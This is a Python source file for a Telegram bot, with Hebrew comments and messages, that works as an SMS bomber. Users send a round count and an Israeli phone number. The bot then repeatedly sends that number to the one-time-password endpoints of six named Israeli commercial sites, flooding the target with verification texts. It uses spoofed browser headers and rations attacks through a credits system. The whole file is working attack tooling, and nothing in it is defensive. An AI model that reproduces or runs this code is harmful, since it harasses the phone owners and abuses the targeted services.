import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os
import uuid
from datetime import datetime, timedelta

# ביטול הגדרות פרוקסי שעלולות לגרום ל-ProxyError ב-Render
os.environ['HTTP_PROXY'] = ""
os.environ['HTTPS_PROXY'] = ""
os.environ['NO_PROXY'] = "api.telegram.org,*"

# --- שרת Flask למניעת כיבוי ---
app = Flask('')

@app.route('/')
def home():
    return "<h1>Turbo Bot is Online</h1>"

def run_flask():
    # Render מעבירה את הפורט במשתנה סביבה PORT
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.start()

# --- הגדרות בוט ---
# מומלץ להגדיר BOT_TOKEN ב-Environment Variables ב-Render
API_TOKEN = os.environ.get("BOT_TOKEN",)
ADMIN_ID = 7265913946
bot = telebot.TeleBot(API_TOKEN)

user_data = {}

def get_user(uid):
    if uid not in user_data:
        user_data[uid] = {'credits': 0, 'last_daily': None}
    return user_data[uid]

def attack(m, target, rounds):
    uid = m.from_user.id
    user = get_user(uid)
    
    apis = [
        {"n": "ACE", "u": "https://www.ace.co.il/login/prelogin/stepone", "d": {"form_key": "d0FvqBYicRoR6FlO", "newaut": "1", "phone": target}, "type": "form", "ref": "https://www.ace.co.il/"},
        {"n": "Dominos", "u": "https://api.dominos.co.il/sendOtp", "d": {"phone": target}, "type": "json", "ref": "https://www.dominos.co.il/"},
        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.mishloha.co.il/"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"}
    ]

    for r in range(int(rounds)):
        if user['credits'] <= 0:
            bot.send_message(m.chat.id, "❌ נגמרו לך הקרדיטים!")
            break
        
        user['credits'] -= 1
        success_count = 0
        
        # שימוש ב-Session לשיפור ביצועים
        session = requests.Session()
        session.trust_env = False # התעלמות מפרוקסי מערכתי
        
        for site in apis:
            try:
                h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Referer": site["ref"]}
                if site["type"] == "json":
                    res = session.post(site["u"], json=site["d"], headers=h, timeout=2)
                else:
                    res = session.post(site["u"], data=site["d"], headers=h, timeout=2)
                
                if res.status_code in [200, 201, 204]:
                    success_count += 1
            except:
                continue
        
        bot.send_message(m.chat.id, f"🚀 סיבוב {r+1} הושלם\n✅ הצלחות: {success_count}/{len(apis)}\n💰 יתרה: {user['credits']}")
        if r < int(rounds) - 1:
            time.sleep(1) # השהייה קלה למניעת חסימה

    bot.send_message(m.chat.id, "🏁 הסתיים!")

# --- פקודות הבוט ---

@bot.message_handler(commands=['start'])
def start(m):
    welcome = (
        "👋 ברוכים הבאים ל-Turbo Bot!\n\n"
        "/me - בדיקת יתרה\n"
        "/daily - בונוס יומי (10 קרדיטים)\n\n"
        "🚀 להפעלה, שלח: [סיבובים] [מספר טלפון]\n"
        "לדוגמה: 5 0501234567"
    )
    bot.send_message(m.chat.id, welcome)

@bot.message_handler(commands=['me'])
def me(m):
    u = get_user(m.from_user.id)
    bot.send_message(m.chat.id, f"👤 המשתמש שלך: {m.from_user.id}\n💰 קרדיטים: {u['credits']}")

@bot.message_handler(commands=['daily'])
def daily(m):
    u = get_user(m.from_user.id)
    now = datetime.now()
    if u['last_daily'] and now < u['last_daily'] + timedelta(days=1):
        bot.reply_to(m, "⚠️ כבר לקחת היום! חזור מחר.")
    else:
        u['credits'] += 10
        u['last_daily'] = now
        bot.reply_to(m, "🎁 קיבלת 10 קרדיטים מתנה!")

@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        p = m.text.split()
        if len(p) == 2 and p[0].isdigit() and p[1].startswith('05'):
            attack(m, p[1], p[0])
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    keep_alive()
    print("Bot is starting...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
